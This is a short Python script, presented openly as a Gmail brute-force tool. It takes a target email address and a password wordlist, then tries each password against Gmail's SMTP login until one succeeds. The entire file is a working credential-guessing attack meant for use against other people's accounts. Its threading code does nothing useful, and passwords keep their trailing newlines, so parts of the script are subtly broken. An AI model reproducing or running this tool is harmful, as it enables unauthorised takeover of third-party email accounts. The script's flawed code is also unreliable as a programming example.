import smtplib
import threading


class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   CWHITE  = '\33[37m'

#Start the smtp server with  port 587
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()
print( 
color.BLUE + """
...
                 ;::::;   Bruteforce tool on gmail
               ;::::; :;  Made by tfwcodes(github)
             ;:::::'   :;
            ;:::::;     ;.
           ,:::::'       ;           OOO
           ::::::;       ;          OOOOO
           ;:::::;       ;         OOOOOOOO
          ,;::::::;     ;'         / OOOOOOO
        ;:::::::::`. ,,,;.        /  / DOOOOOO
      .';:::::::::::::::::;,     /  /     DOOOO
     ,::::::;::::::;;;;::::;,   /  /        DOOO
    ;`::::::`'::::::;;;::::: ,#/  /          DOOO
    :`:::::::`;::::::;;::: ;::#  /            DOOO
    ::`:::::::`;:::::::: ;::::# /              DOO
    `:`:::::::`;:::::: ;::::::#/               DOO
     :::`:::::::`;; ;:::::::::##                OO
     ::::`:::::::`;::::::::;:::#                OO
     `:::::`::::::::::::;'`:;::#                O
      `:::::`::::::::;' /  / `:#
       ::::::`:::::;'  /  /   `#
""")
print(color.BLUE + "Welome To Gmail Bruteforce")

#Target email addres
user = input(color.PURPLE + "Enter Target Email Address: ")
#Dictionary for the bruteforce
passwfile = input(color.PURPLE + "Enter Dictionary: ")
passwfile = open(passwfile, "r")

#list of threads
threads = []

for password in passwfile:
    #Try to login
    try:
        smtpserver.login(user, password)
        # Starting the threads for the attack
        t = threading.Thread()
        t.daemon = True
        t.start()
        threads.append(t)
        for i in range(50):
            t.join()
        print(color.GREEN + "[+] Password Found: %s" % password)
        input()
        break;
        input()
    #Except it didn't manage to find the password
    except smtplib.SMTPAuthenticationError:
        print(color.GREEN + "[!] Incorrect Password: %s" % password)


